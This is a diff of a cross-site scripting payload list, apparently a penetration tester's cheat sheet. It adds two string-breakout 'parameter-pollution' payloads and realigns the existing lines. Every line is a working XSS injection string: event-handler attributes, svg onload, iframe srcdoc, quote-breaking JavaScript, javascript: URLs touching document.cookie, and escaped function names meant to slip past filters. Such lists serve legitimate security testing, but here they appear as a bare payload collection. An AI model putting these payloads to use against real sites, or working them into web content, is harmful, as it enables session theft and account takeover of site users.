@@ -10,9 +10,11 @@ Please do visit as well: https://github.com/s0md3v/AwesomeXSS
 <iframe srcdoc="<img src=x onerror=alert(999)>"></iframe>
 [{\"displayName\":\"<img src=x onmouseover=prompt(document.domain)>\"}]
 <img/src/onerror=prompt(document.domain)>
-admin";alert(1);//                                                        --> Imp
-xss" onmouseover="alert(1)                                                --> Imp
-"><svg onload=alert(1)>                                                   --> Imp
+admin";alert(1);//                                                       --> Imp
+"%3balert(`parameter-pollution`)%2f%2f                                   --> Imp
+";alert(`parameter-pollution`)//                                         --> Imp
+xss" onmouseover="alert(1)                                               --> Imp
+"><svg onload=alert(1)>                                                  --> Imp
 javascript:alert(document.cookie)                                        --> Imp
 <img src=1 href=1 onerror="javascript:alert(1)"></img>
 <img src="x:gif" onerror="window['al\u0065rt'](0)"></img>
